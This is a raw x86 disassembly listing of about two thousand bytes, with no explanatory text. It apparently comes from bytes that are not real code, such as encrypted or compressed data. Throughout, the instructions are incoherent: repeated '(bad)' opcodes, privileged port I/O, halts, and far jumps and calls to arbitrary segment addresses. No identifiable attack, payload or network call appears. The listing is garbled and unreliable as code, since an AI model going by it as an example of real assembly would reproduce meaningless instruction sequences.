  412f67:	mov    ds:0xe096f2d9,eax
  412f6c:	dec    esp
  412f6d:	ss jbe 0x412f1d
  412f70:	enter  0x356a,0x9f
  412f74:	inc    ebx
  412f75:	rol    DWORD PTR [eax+0x7d4477e8],1
  412f7b:	pop    edx
  412f7c:	dec    eax
  412f7d:	and    DWORD PTR [ecx-0x3d],ebp
  412f80:	ror    ebx,1
  412f82:	push   ecx
  412f83:	sbb    bh,BYTE PTR [eax]
  412f85:	add    DWORD PTR [eax+edx*1+0x61],ecx
  412f89:	dec    edi
  412f8a:	xor    eax,0xd20cfe02
  412f8f:	dec    edx
  412f90:	add    al,0x8
  412f92:	jbe    0x412f41
  412f94:	ret    0xe281
  412f97:	mov    bl,ah
  412f99:	xor    BYTE PTR [ecx-0x24],al
  412f9c:	sub    ecx,edx
  412f9e:	adc    al,0x1a
  412fa0:	(bad)  
  412fa1:	enter  0xeecb,0x7c
  412fa5:	xlat   BYTE PTR ds:[ebx]
  412fa6:	push   ds
  412fa7:	gs stos DWORD PTR es:[edi],eax
  412fa9:	div    BYTE PTR [ecx+0x272d2395]
  412faf:	out    0x40,eax
  412fb1:	push   0xffffffe0
  412fb3:	mov    ebx,0xf5e74875
  412fb8:	sbb    edx,DWORD PTR ds:0x6b85fa62
  412fbe:	push   ebp
  412fbf:	arpl   WORD PTR [bx+di-0x61bf],bp
  412fc4:	call   0x4453d362
  412fc9:	adc    dh,dh
  412fcb:	retf   0xbd70
  412fce:	dec    ebp
  412fcf:	sbb    eax,0xbf12150c
  412fd4:	add    DWORD PTR [esi-0x2d],ecx
  412fd7:	sbb    al,0x73
  412fd9:	rcl    DWORD PTR [eax],0x97
  412fdc:	jne    0x412fc8
  412fde:	lea    ebp,[ebx-0x449485d0]
  412fe4:	mov    edx,0x68f82532
  412fe9:	in     al,dx
  412fea:	scas   eax,DWORD PTR es:[edi]
  412feb:	adc    BYTE PTR [edi],ah
  412fed:	add    al,0xc0
  412fef:	jo     0x413012
  412ff1:	loop   0x412f82
  412ff3:	je     0x412f86
  412ff5:	sti    
  412ff6:	xchg   esi,eax
  412ff7:	jbe    0x412ff1
  412ff9:	xor    DWORD PTR [ebp-0x36],esi
  412ffc:	icebp  
  412ffd:	mov    esi,0xdd816ec7
  413002:	hlt    
  413003:	or     dl,dh
  413005:	mov    ch,0x6a
  413007:	ret    0xd31c
  41300a:	cld    
  41300b:	sub    DWORD PTR [eax-0x7bb06305],ecx
  413011:	daa    
  413012:	bound  eax,QWORD PTR [esi+0xe]
  413015:	mov    ebp,0x7c636141
  41301a:	cmp    ah,BYTE PTR [esi-0x6908f88]
  413020:	add    eax,0x8c348435
  413025:	dec    edi
  413026:	cmp    al,0x62
  413028:	xor    ecx,ecx
  41302a:	out    0xa,eax
  41302c:	retf   
  41302d:	ret    
  41302e:	cwde   
  41302f:	or     ebp,DWORD PTR [edx+edi*1-0xe32daae]
  413036:	cwde   
  413037:	cli    
  413038:	mov    al,ds:0x878026bc
  41303d:	mov    al,0x78
  41303f:	sti    
  413040:	inc    ebx
  413041:	xchg   DWORD PTR [edx+esi*4+0x7b],eax
  413045:	jmp    0x3049:0x8e665e13
  41304c:	xchg   edi,eax
  41304d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41304e:	cld    
  41304f:	lea    ebp,[edi]
  413051:	mov    eax,eax
  413053:	sub    DWORD PTR [ebp+esi*2-0x16],edx
  413057:	cmp    BYTE PTR [ebx-0x6f],cl
  41305a:	push   ds
  41305b:	not    DWORD PTR [ecx+0x47]
  41305e:	mov    dl,0x2e
  413060:	and    DWORD PTR [edx+0x74],0xcb196239
  413067:	ins    BYTE PTR es:[edi],dx
  413068:	push   esi
  413069:	jmp    0x7f7d:0x24e20b05
  413070:	aas    
  413071:	ret    0xaf48
  413074:	ror    BYTE PTR [esi+0x1e2f61d6],0x4d
  41307b:	inc    dh
  41307d:	jecxz  0x41309a
  41307f:	pop    esi
  413080:	aas    
  413081:	pop    esi
  413082:	and    BYTE PTR [ecx+eiz*4],cl
  413085:	jo     0x41300c
  413087:	mov    bh,0xae
  413089:	adc    DWORD PTR [esi-0x6d],esp
  41308c:	xchg   ebx,eax
  41308d:	icebp  
  41308e:	jbe    0x41309e
  413090:	mov    ds:0x337ca87b,eax
  413095:	pop    esi
  413096:	pushf  
  413097:	jmp    0x59aa:0xb2c8675c
  41309e:	push   esp
  41309f:	inc    eax
  4130a0:	(bad)  
  4130a1:	rol    BYTE PTR [esi+esi*1-0x3e749e59],1
  4130a8:	lods   eax,DWORD PTR ds:[esi]
  4130a9:	push   esi
  4130aa:	aad    0x32
  4130ac:	lock cli 
  4130ae:	jmp    0xe8a2:0x7f8121fa
  4130b5:	out    dx,al
  4130b6:	clc    
  4130b7:	add    eax,0x651e20bf
  4130bc:	push   eax
  4130bd:	cs jae 0x4130ca
  4130c0:	(bad)  
  4130c1:	inc    edi
  4130c2:	jnp    0x413056
  4130c4:	xchg   ecx,eax
  4130c5:	mov    WORD PTR [esi+0x12],?
  4130c8:	out    dx,al
  4130c9:	adc    ch,BYTE PTR [ebp-0x4e508665]
  4130cf:	mov    bl,0x70
  4130d1:	rcr    DWORD PTR ds:[ebx+0x69],0x81
  4130d6:	pop    ss
  4130d7:	mov    ch,0xff
  4130d9:	ror    BYTE PTR [eax-0x70eb5327],1
  4130df:	mov    edx,0xa87ef4f4
  4130e4:	test   eax,0xf251561a
  4130e9:	xor    DWORD PTR es:[edi+0x25fbd7e2],0xfffffffc
  4130f1:	sbb    DWORD PTR [ecx+0x70],ebx
  4130f4:	ins    BYTE PTR es:[edi],dx
  4130f5:	cmp    eax,0xcb70ec98
  4130fa:	clc    
  4130fb:	dec    eax
  4130fc:	jnp    0x413153
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	repz push edx
  413101:	(bad)  
  413102:	pop    ebp
  413103:	das    
  413104:	std    
  413105:	mov    ah,0x8e
  413107:	mov    esi,edi
  413109:	fst    DWORD PTR [ecx+ebp*2]
  41310c:	xchg   esp,eax
  41310d:	mov    bh,0x66
  41310f:	inc    ecx
  413110:	dec    ecx
  413111:	dec    eax
  413112:	jno    0x413163
  413114:	dec    ebx
  413115:	mov    dh,0x32
  413117:	daa    
  413118:	ja     0x41316b
  41311a:	or     eax,0xe5e6d2a2
  41311f:	hlt    
  413120:	js     0x41319f
  413122:	dec    esi
  413123:	cmp    DWORD PTR [edi+0x32],0x5c35f14b
  41312a:	cdq    
  41312b:	retf   0x4779
  41312e:	pop    edx
  41312f:	scas   al,BYTE PTR es:[edi]
  413130:	sub    DWORD PTR [edi],esp
  413132:	scas   eax,DWORD PTR es:[edi]
  413133:	fld    TBYTE PTR [eax]
  413135:	out    dx,al
  413136:	loopne 0x4131a4
  413138:	xchg   edx,eax
  413139:	xor    eax,0xb239132a
  41313e:	ins    DWORD PTR es:[edi],dx
  41313f:	shl    DWORD PTR [esi],0x1a
  413142:	push   ds
  413143:	push   ebx
  413144:	adc    edx,DWORD PTR [edx-0x73]
  413147:	(bad)  
  413148:	cmp    eax,esp
  41314a:	aam    0xf5
  41314c:	rcl    DWORD PTR [edi-0x36f30b8e],1
  413152:	mov    esp,esi
  413154:	not    BYTE PTR [esi+edx*1-0x10]
  413158:	sub    eax,0xad8497a3
  41315d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41315f:	push   ss
  413160:	push   0xd41d4714
  413165:	imul   edi,DWORD PTR [edx-0x7cfe6d3e],0x731d7ac2
  41316f:	pop    ebx
  413170:	xchg   DWORD PTR [ecx-0x6d],ecx
  413173:	xchg   BYTE PTR [esp+ebp*2-0x6c],dl
  413177:	mov    edx,0x1fd215ba
  41317c:	cdq    
  41317d:	push   ds
  41317e:	cli    
  41317f:	jg     0x4131c1
  413181:	inc    edi
  413182:	rcr    esp,cl
  413184:	jmp    0x41315b
  413186:	adc    bh,0xeb
  413189:	sub    al,0x73
  41318b:	mov    ss,WORD PTR [esi+0x7b]
  41318e:	enter  0xe48,0x31
  413192:	adc    al,0xe
  413194:	clc    
  413195:	cli    
  413196:	push   cs
  413197:	jo     0x413128
  413199:	jae    0x4131cb
  41319b:	std    
  41319c:	into   
  41319d:	loop   0x4131c4
  41319f:	mov    ebp,esp
  4131a1:	cdq    
  4131a2:	sub    DWORD PTR [esi+0x59a3dafa],esi
  4131a8:	(bad)  
  4131a9:	(bad)  
  4131aa:	sbb    eax,0x7c7cd64a
  4131af:	imul   eax,esi,0xb25668e4
  4131b5:	pop    ecx
  4131b6:	push   ds
  4131b7:	xor    ebp,DWORD PTR [eax]
  4131b9:	inc    BYTE PTR [esi+0x4b092c4e]
  4131bf:	in     eax,0x13
  4131c1:	lock pop edx
  4131c3:	fld    TBYTE PTR [ecx]
  4131c5:	xor    DWORD PTR [edx-0x4e],ebx
  4131c8:	pop    ebp
  4131c9:	out    0xd3,eax
  4131cb:	lds    ebx,FWORD PTR [edi+eiz*2-0x2e]
  4131cf:	cld    
  4131d0:	aaa    
  4131d1:	cdq    
  4131d2:	adc    eax,0x5c0b7932
  4131d7:	add    al,bh
  4131d9:	popaw  
  4131db:	mov    ?,ebp
  4131dd:	pop    ebp
  4131de:	jle    0x4131a3
  4131e0:	repnz xchg edx,eax
  4131e2:	dec    ecx
  4131e3:	repnz mov WORD PTR [ebx-0x5d],?
  4131e7:	push   cs
  4131e8:	push   es
  4131e9:	jl     0x413176
  4131eb:	stos   BYTE PTR es:[edi],al
  4131ec:	jno    0x4131cc
  4131ee:	pop    edx
  4131ef:	dec    edi
  4131f0:	(bad)  
  4131f1:	mov    eax,0x13d4405d
  4131f6:	arpl   WORD PTR [edx+0x76],cx
  4131f9:	outs   dx,BYTE PTR ds:[esi]
  4131fa:	add    al,0x5e
  4131fc:	pop    ebx
  4131fd:	sbb    DWORD PTR [edx],esi
  4131ff:	dec    eax
  413200:	xchg   ecx,eax
  413201:	ins    DWORD PTR es:[edi],dx
  413202:	pop    esp
  413203:	or     DWORD PTR [esi+0x3a],edi
  413206:	pusha  
  413207:	sar    DWORD PTR [ebx+0x75cae745],1
  41320d:	mov    gs,WORD PTR [edx+0x3c]
  413210:	loop   0x413208
  413212:	nop
  413213:	test   eax,0xfde054dd
  413218:	pop    edx
  413219:	inc    edx
  41321a:	mov    esp,0xe1371056
  41321f:	or     bh,BYTE PTR [esi-0x1b15ab30]
  413225:	sbb    al,BYTE PTR [edi*2-0x7eea9e5]
  41322c:	sbb    ah,BYTE PTR [esi-0x7b221cb9]
  413232:	jno    0x41329d
  413234:	pcmpgtw mm5,QWORD PTR [ebx+0x5b8fbd5c]
  41323b:	mov    dh,0xf1
  41323d:	andnps xmm1,XMMWORD PTR [ecx-0x21]
  413241:	test   BYTE PTR [edi+0x7],dh
  413244:	(bad)  
  413245:	(bad)  
  413246:	fmul   DWORD PTR [ecx+0x30dbb0f2]
  41324c:	inc    esi
  41324d:	push   es
  41324e:	push   ss
  41324f:	cs ret 0x3797
  413253:	nop
  413254:	push   esp
  413255:	or     al,0xaf
  413257:	ss fs fcmovnb st,st(3)
  41325b:	call   0xa8f9cbb0
  413260:	popa   
  413261:	shl    bh,cl
  413263:	mov    ecx,0x30d96962
  413268:	push   ss
  413269:	xchg   esp,eax
  41326a:	dec    edx
  41326b:	cli    
  41326c:	pop    ss
  41326d:	jo     0x41329c
  41326f:	dec    edi
  413270:	adc    DWORD PTR [esi+0x4ecc7bd3],esp
  413276:	xor    DWORD PTR [ebx-0x30],ebx
  413279:	jns    0x4131fd
  41327b:	add    esi,DWORD PTR [edx]
  41327d:	adc    al,0xd2
  41327f:	jmp    0x7fc1cc8f
  413284:	inc    edi
  413285:	push   ecx
  413286:	pop    es
  413287:	imul   eax,DWORD PTR [ecx-0x4a],0xe0550663
  41328e:	adc    edx,ecx
  413290:	pop    es
  413291:	fnstcw WORD PTR [edi]
  413293:	loopne 0x41324c
  413295:	mov    al,ds:0xb02164ed
  41329a:	mov    eax,0x2916221d
  41329f:	jl     0x4132e3
  4132a1:	iret   
  4132a2:	jecxz  0x413286
  4132a4:	fwait
  4132a5:	dec    esp
  4132a6:	ds fs and al,0x7c
  4132aa:	loop   0x41323b
  4132ac:	cs mov ebp,0x840d1942
  4132b2:	sbb    BYTE PTR [ebp-0x67be3b3f],bl
  4132b8:	sub    DWORD PTR [edi+0x3023ee51],ebx
  4132be:	dec    esi
  4132bf:	pushf  
  4132c0:	lods   al,BYTE PTR ds:[esi]
  4132c1:	pushf  
  4132c2:	mov    al,0x9b
  4132c4:	mov    ebx,ecx
  4132c6:	and    DWORD PTR [edx+0x6c],esi
  4132c9:	and    eax,0x8255e20a
  4132ce:	fwait
  4132cf:	leave  
  4132d0:	ss es test dl,bl
  4132d4:	out    dx,al
  4132d5:	out    0x7c,al
  4132d7:	inc    esi
  4132d8:	out    0x4d,eax
  4132da:	or     dh,BYTE PTR [edi-0x5a988cc5]
  4132e0:	sbb    dh,BYTE PTR [esi]
  4132e2:	push   ebx
  4132e3:	fnstcw WORD PTR [esp+ecx*8]
  4132e6:	loope  0x413291
  4132e8:	push   edx
  4132ea:	in     al,dx
  4132eb:	mov    ds:0xb0dccea5,al
  4132f0:	bound  ebx,QWORD PTR [ebx-0x3d1f0a59]
  4132f6:	dec    esi
  4132f7:	gs mov bh,0x6e
  4132fa:	sub    esi,ebx
  4132fc:	int3   
  4132fd:	adc    BYTE PTR [edx+eiz*1+0x52],bh
  413301:	inc    ebp
  413302:	sub    ebp,DWORD PTR [edi+0x28]
  413305:	aas    
  413306:	jo     0x4132ca
  413308:	fisttp QWORD PTR [ecx]
  41330a:	mov    DWORD PTR [esi],esp
  41330c:	imul   edx,esi,0xe68d06bc
  413312:	neg    DWORD PTR [ecx]
  413314:	ss push 0xbc72584f
  41331a:	push   esp
  41331b:	xor    dl,cl
  41331d:	stc    
  41331e:	cmp    BYTE PTR [ebx-0xc356850],cl
  413324:	push   ebp
  413325:	dec    edi
  413326:	xchg   BYTE PTR cs:[edx+0xe],al
  41332a:	repz jl 0x41331d
  41332d:	push   ss
  41332e:	jp     0x41335c
  413330:	nop
  413331:	leave  
  413332:	jne    0x41336f
  413334:	pop    eax
  413335:	call   0xe3ac:0xb947de13
  41333c:	sti    
  41333d:	test   DWORD PTR ds:0x2ea2c1f7,ebx
  413343:	dec    ecx
  413344:	push   ebp
  413345:	nop    DWORD PTR [edi]
  413348:	sbb    BYTE PTR [edi],dh
  41334a:	pop    ds
  41334b:	leave  
  41334c:	popa   
  41334d:	sbb    ebp,DWORD PTR ds:[ecx+ecx*8+0x522fa538]
  413355:	pop    ebp
  413356:	idiv   DWORD PTR [edx+ebp*8-0x736b2e43]
  41335d:	mov    eax,ds:0x72f06632
  413362:	push   es
  413363:	outs   dx,BYTE PTR ds:[esi]
  413364:	pusha  
  413365:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  413367:	mov    bh,0x77
  413369:	mov    esi,0x5144032c
  41336e:	les    esp,FWORD PTR [esi+0x7c0f1a7c]
  413374:	retf   0xe962
  413377:	and    ecx,DWORD PTR [edx+0x35]
  41337a:	mov    esp,0xb0779d16
  41337f:	out    0x5,eax
  413381:	xchg   ebx,eax
  413382:	xlat   BYTE PTR ds:[ebx]
  413383:	aaa    
  413384:	mov    edx,0x5d760bf6
  413389:	loope  0x41339b
  41338b:	outs   dx,DWORD PTR ds:[esi]
  41338c:	(bad)  
  41338d:	(bad)  
  413390:	adc    al,0xcd
  413392:	and    esp,0xffffffe8
  413395:	or     DWORD PTR [ebx+0x445f9cd],edi
  41339b:	retf   0x2034
  41339e:	in     eax,dx
  41339f:	ins    BYTE PTR es:[edi],dx
  4133a0:	stc    
  4133a1:	xchg   ecx,eax
  4133a2:	jno    0x4133b6
  4133a4:	add    eax,0x839cf506
  4133a9:	dec    ebp
  4133aa:	fs and al,0xcc
  4133ad:	(bad)  
  4133ae:	fs sahf 
  4133b0:	xchg   edx,eax
  4133b1:	je     0x413362
  4133b3:	(bad)  
  4133b4:	outs   dx,BYTE PTR ds:[esi]
  4133b5:	in     al,0xb4
  4133b7:	out    0x73,eax
  4133b9:	not    BYTE PTR [edi+eax*8-0x3b20c1fa]
  4133c0:	(bad)  
  4133c1:	jp     0x4133b2
  4133c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133c4:	cli    
  4133c5:	jae    0x413373
  4133c7:	aam    0xbe
  4133c9:	loopne 0x413411
  4133cb:	loop   0x4133e9
  4133cd:	mov    esi,0x8cee5051
  4133d2:	sbb    DWORD PTR [esi+ebx*1-0x29],ecx
  4133d6:	enter  0x35dc,0x30
  4133da:	add    eax,0xfb07f11d
  4133df:	add    BYTE PTR [eax+0x10],dl
  4133e2:	mov    edx,0xc0d04c59
  4133e7:	xor    eax,esp
  4133e9:	adc    al,0x66
  4133eb:	setno  BYTE PTR [edx-0x6b]
  4133ef:	xchg   esp,eax
  4133f0:	stc    
  4133f1:	mov    dl,BYTE PTR [ecx]
  4133f3:	inc    edi
  4133f4:	inc    edx
  4133f5:	test   edi,edi
  4133f7:	xchg   cl,ah
  4133f9:	loope  0x413435
  4133fb:	add    BYTE PTR [ebp+ecx*4+0x53230397],dl
  413402:	pop    ebp
  413403:	sub    al,0x79
  413405:	mov    bl,0xac
  413407:	xchg   ebx,eax
  413408:	xchg   DWORD PTR [esi+0x1c],ebp
  41340b:	mov    eax,0xcac7fba2
  413410:	(bad)  
  413411:	push   esi
  413412:	jg     0x413482
  413414:	fistp  DWORD PTR [esi+0x2f3f8664]
  41341a:	loop   0x4133b0
  41341c:	int3   
  41341d:	cmovp  esi,DWORD PTR [esi]
  413420:	repnz (bad) 
  413422:	ins    BYTE PTR es:[edi],dx
  413423:	retf   
  413424:	test   eax,0xa8134f1b
  413429:	pop    ss
  41342a:	call   0x9eaffb71
  41342f:	sub    cl,ch
  413431:	jnp    0x41344a
  413433:	jno    0x413419
  413435:	xor    eax,0x9f0e8332
  41343a:	mov    cl,0x3f
  41343c:	cmp    edx,edx
  41343e:	sbb    dh,BYTE PTR [edi+0x56]
  413441:	call   0x88db:0x5dedae3f
  413448:	inc    ebp
  413449:	rol    BYTE PTR [ecx+0x39692428],cl
  41344f:	aad    0x3a
  413451:	pop    ss
  413452:	mov    ebp,0xc8a2dcc6
  413457:	inc    eax
  413458:	movlps QWORD PTR [ebx],xmm1
  41345b:	mov    cl,0xc4
  41345d:	lods   eax,DWORD PTR ds:[esi]
  41345e:	sti    
  41345f:	inc    edx
  413460:	adc    ebx,DWORD PTR [eax]
  413462:	jmp    0xc13ae7f4
  413467:	mov    bh,0x6e
  413469:	les    esp,FWORD PTR [ebx-0x5f]
  41346c:	test   BYTE PTR [esi],0x38
  41346f:	cli    
  413470:	sub    eax,0x5d92b75c
  413475:	and    bl,BYTE PTR [ebx+ecx*8]
  413478:	ja     0x41344c
  41347a:	cli    
  41347b:	cdq    
  41347c:	out    0xf3,eax
  41347e:	ret    
  41347f:	pop    ss
  413480:	popa   
  413481:	or     eax,0xad5c3e37
  413486:	mov    ch,0x9d
  413488:	jecxz  0x4134fc
  41348a:	dec    ebp
  41348b:	sbb    DWORD PTR [esi+0x78],ebx
  41348e:	arpl   WORD PTR es:[edx+esi*4],bx
  413492:	stos   DWORD PTR es:[edi],eax
  413493:	fwait
  413494:	xor    al,ah
  413496:	(bad)  
  413497:	(bad)  
  413498:	loope  0x4134ca
  41349a:	retf   0x89d0
  41349d:	pushf  
  41349e:	jno    0x413514
  4134a0:	mov    cl,0xf6
  4134a2:	out    dx,al
  4134a3:	hlt    
  4134a4:	and    bl,BYTE PTR [eax]
  4134a6:	jmp    0x7db4:0x2e3eb04a
  4134ad:	cmp    al,0xe0
  4134af:	and    ecx,edx
  4134b1:	and    DWORD PTR [ecx],eax
  4134b3:	(bad)  
  4134b4:	out    dx,al
  4134b5:	add    eax,0xbb00506f
  4134ba:	dec    edi
  4134bb:	popa   
  4134bc:	adc    ebx,edi
  4134be:	das    
  4134bf:	ds adc dh,al
  4134c2:	mov    ds,WORD PTR [ebx-0x2e]
  4134c5:	mov    eax,ds:0x1c942ef2
  4134ca:	cmp    eax,DWORD PTR [edx-0x72e16600]
  4134d0:	mov    eax,0x65c6f8bc
  4134d5:	xchg   ebx,edi
  4134d7:	xor    DWORD PTR ds:0xcf56bc76,eax
  4134dd:	loop   0x4134a3
  4134df:	fwait
  4134e0:	lahf   
  4134e1:	das    
  4134e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e3:	pop    es
  4134e4:	pop    ds
  4134e5:	loope  0x413510
  4134e7:	jb     0x413477
  4134e9:	xchg   ecx,eax
  4134ea:	pop    ss
  4134eb:	mov    WORD PTR [esi],ss
  4134ed:	mov    WORD PTR [ecx-0x625c6333],ss
  4134f3:	mov    dh,0x7e
  4134f5:	pop    ecx
  4134f6:	sbb    esp,esi
  4134f8:	loope  0x413487
  4134fa:	ret    
  4134fb:	pop    ebp
  4134fc:	cmp    dh,BYTE PTR [eax]
  4134fe:	mov    al,ds:0xc941a503
  413503:	cs jmp 0xb4307c85
  413509:	sbb    dl,BYTE PTR [edi-0x4865e3c]
  41350f:	add    al,0xb1
  413511:	lds    ecx,FWORD PTR [ecx]
  413513:	jo     0x4134de
  413515:	in     eax,dx
  413516:	cwde   
  413517:	lods   al,BYTE PTR ds:[esi]
  413518:	outs   dx,DWORD PTR ds:[esi]
  413519:	add    DWORD PTR [ecx-0x5a],esi
  41351c:	inc    edi
  41351d:	(bad)  
  41351e:	in     al,0x52
  413520:	fisubr DWORD PTR [ebx+0x50574714]
  413526:	(bad)  
  413527:	xchg   edi,eax
  413528:	pop    es
  413529:	xchg   ebx,eax
  41352a:	mov    BYTE PTR [edi],ch
  41352c:	jmp    0xed8a8390
  413531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413532:	inc    eax
  413533:	pop    ebp
  413534:	test   DWORD PTR [edi-0x38a1408c],ebp
  41353a:	sbb    eax,0xdff0cfe1
  41353f:	dec    esp
  413540:	ins    BYTE PTR es:[edi],dx
  413541:	clc    
  413542:	je     0x4135ac
  413544:	jae    0x4135b1
  413546:	call   0xe16:0x74a1a55f
  41354d:	or     BYTE PTR [esi],bh
  41354f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413551:	and    eax,0x72a36ae5
  413556:	mov    DWORD PTR ds:0x61f8f43,0xef518a57
  413560:	pusha  
  413561:	aaa    
  413562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413563:	fwait
  413564:	xchg   ebp,eax
  413565:	imul   ebp,DWORD PTR [ebp+0x7f],0x4f560fdc
  41356c:	sub    eax,0x786420f1
  413571:	cmp    BYTE PTR [edx],cl
  413573:	and    bh,BYTE PTR [eax-0x3d]
  413576:	add    eax,0xb880f5c4
  41357b:	cwde   
  41357c:	pop    ebp
  41357d:	xchg   cl,al
  41357f:	sbb    ecx,DWORD PTR [ecx+ebx*2]
  413582:	ja     0x4135ad
  413584:	aam    0xef
  413586:	pop    ds
  413587:	pop    ebp
  413588:	dec    eax
  413589:	pop    ebp
  41358a:	ja     0x4135b9
  41358c:	ret    
  41358d:	icebp  
  41358e:	iret   
  41358f:	fisttp DWORD PTR [ebp+0x52]
  413592:	fwait
  413593:	repnz cs mov edx,0x540711c
  41359a:	cmp    eax,0xb3befd82
  41359f:	popa   
  4135a0:	stos   DWORD PTR es:[edi],eax
  4135a1:	push   ebp
  4135a2:	or     DWORD PTR [ebx],0x4b
  4135a5:	enter  0x8392,0x70
  4135a9:	ficomp DWORD PTR [ecx]
  4135ab:	xor    bh,BYTE PTR [edi+0x71]
  4135ae:	jge    0x41356e
  4135b0:	push   ds
  4135b1:	xor    edi,DWORD PTR [ebp-0x6e]
  4135b4:	fwait
  4135b5:	ret    
  4135b6:	les    ecx,FWORD PTR [edx+0x52]
  4135b9:	mov    edx,0x42178a60
  4135be:	dec    ebx
  4135bf:	and    DWORD PTR [edx+0x7b99f135],esp
  4135c5:	lods   eax,DWORD PTR ds:[esi]
  4135c6:	jns    0x4135b9
  4135c8:	jle    0x41363b
  4135ca:	sbb    DWORD PTR [ebp-0x1e],ebp
  4135cd:	jp     0x413591
  4135cf:	and    eax,0xdeca38ee
  4135d4:	test   eax,0x805ab1bf
  4135d9:	ja     0x413585
  4135db:	mov    ah,0x29
  4135dd:	mov    BYTE PTR ds:0xdb6e970,0xb0
  4135e4:	fstp   st(7)
  4135e6:	or     ch,BYTE PTR [edx+esi*8+0x4218eb7e]
  4135ed:	pop    ebx
  4135ee:	iret   
  4135ef:	dec    ebp
  4135f0:	and    al,0xf3
  4135f2:	in     eax,dx
  4135f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f4:	adc    DWORD PTR [ebx+0x4be712ff],0xffffff8a
  4135fb:	mov    al,ds:0x77c04c67
  413600:	mov    bh,0x66
  413602:	inc    edx
  413603:	ror    esp,1
  413605:	test   BYTE PTR [ecx+0x21],dh
  413608:	lahf   
  413609:	cmp    eax,0x185261d1
  41360e:	stos   BYTE PTR es:[edi],al
  41360f:	xchg   esi,eax
  413610:	xchg   esp,eax
  413611:	dec    ebp
  413612:	xchg   esp,eax
  413613:	push   0x40ebcc65
  413618:	or     ah,cl
  41361a:	sub    eax,DWORD PTR [ecx]
  41361c:	cwde   
  41361d:	and    ch,cl
  41361f:	and    al,0xc
  413621:	sbb    edx,DWORD PTR [edx+0x57a3e1bb]
  413627:	mov    ds:0x1f7691da,eax
  41362c:	popf   
  41362d:	mov    ah,0x39
  41362f:	adc    edx,DWORD PTR [edx-0x2baec3a8]
  413635:	aaa    
  413636:	mov    ebx,0x408d9707
  41363b:	mov    ah,0x51
  41363d:	jp     0x413692
  41363f:	xchg   esi,eax
  413640:	mov    DWORD PTR [eax],esp
  413642:	cmp    BYTE PTR [eax+0x61],0xfe
  413646:	xor    BYTE PTR [ebx],dl
  413648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413649:	mov    DWORD PTR [ebx],esp
  41364b:	es jbe 0x4135d0
  41364e:	jo     0x413681
  413650:	mov    ah,0xb1
  413652:	xor    ax,0xf309
  413656:	push   ecx
  413657:	retf   0xd09d
  41365a:	mov    ch,dh
  41365c:	inc    eax
  41365d:	out    dx,eax
  41365e:	and    ch,dh
  413660:	test   al,0xd
  413662:	adc    DWORD PTR ds:0x76fcb386,esi
  413668:	push   ebp
  413669:	mov    ah,0xcb
  41366b:	push   edi
  41366c:	imul   ebp,DWORD PTR [ebp+0x5b5889ff],0x32f15043
  413676:	test   DWORD PTR fs:[eax],esi
  413679:	in     al,dx
  41367a:	(bad)  
  41367b:	jmp    0x413600
  41367d:	jmp    0x2b2d:0xda9e900d
  413684:	sahf   
  413685:	inc    edx
  413686:	and    eax,0x3bf3ecb4
  41368b:	stc    
  41368c:	into   
  41368d:	xlat   BYTE PTR ds:[ebx]
  41368e:	cdq    
  41368f:	push   esi
  413690:	push   0x32fd899a
  413695:	jp     0x4136cb
  413697:	popf   
  413698:	hlt    
  413699:	jecxz  0x413641
  41369b:	gs (bad) 
  41369d:	repnz sub BYTE PTR [edx+0x27],dl
  4136a1:	out    0xcd,al
  4136a3:	mov    DWORD PTR [esi],edi
  4136a5:	fistp  WORD PTR [bp-0x1]
  4136a9:	popf   
  4136aa:	xor    eax,0xc5648ef8
  4136af:	frstor [ebp+0x44f979de]
  4136b5:	aam    0xbe
  4136b7:	fwait
  4136b8:	ret    
  4136b9:	gs (bad) 
  4136bc:	mov    ds,WORD PTR [esp+ebp*2]
  4136bf:	jl     0x413668
  4136c1:	mov    eax,0x17532110
  4136c6:	repnz cwde 
  4136c8:	sahf   
  4136c9:	in     eax,dx
  4136ca:	jmp    0x4136b7
  4136cc:	push   ebp
  4136cd:	ret    0xafd6
  4136d0:	jnp    0x413749
  4136d2:	les    ecx,FWORD PTR [edx]
  4136d4:	(bad)  
  4136d5:	fstp   DWORD PTR [ebp+edx*4+0x3aa010cd]
  4136dc:	dec    eax
  4136dd:	stos   BYTE PTR es:[edi],al
  4136de:	push   0xe1ec91e
  4136e3:	(bad)  
  4136e4:	or     al,0xa1
  4136e6:	push   ebp
  4136e7:	les    ecx,FWORD PTR [edi]
  4136e9:	xchg   eax,ecx
  4136eb:	push   ebp
  4136ec:	les    esi,FWORD PTR [esi-0x2f8ac3c3]
  4136f2:	jae    0x413714
  4136f4:	jl     0x413677
  4136f6:	push   esp
  4136f7:	pop    esi
  4136f8:	push   0x5cfb8eba
  4136fd:	leave  
  4136fe:	adc    al,0xb9
  413700:	hlt    
  413701:	or     dl,BYTE PTR [ebx+0x67]
  413704:	cmp    ch,BYTE PTR [ebp+0x7029ad]
  41370a:	push   esi
  41370b:	aad    0xbb
  41370d:	shr    BYTE PTR [eax],cl
  41370f:	xor    BYTE PTR [ecx+eiz*4+0x1],ah
  413713:	in     eax,0x26
  413715:	xor    eax,0x3190d9a
  41371a:	adc    eax,edx
  41371c:	sub    eax,0xd33d36ba
  413721:	mov    ecx,0xe821260
  413726:	jmp    0x4136dd
  413728:	punpckhbw mm4,QWORD PTR [edi+ebp*4-0x29589d34]
  413730:	fbstp  TBYTE PTR [ecx+0x3f230080]
  413736:	mov    ds:0xf3f58fb0,eax
  41373b:	test   eax,0xcebfca6d
  413740:	xor    esi,ebp
  413742:	and    DWORD PTR [esp+edx*1-0xb],edx
  413746:	dec    edi
  413747:	pushf  
  413748:	and    DWORD PTR [ecx-0xeba7a5f],ebp
  41374e:	stos   DWORD PTR es:[edi],eax
  41374f:	jle    0x41370b
  413751:	dec    ebp
  413752:	pusha  
  413753:	out    dx,al
  413754:	sub    DWORD PTR [edi+0x59],edx
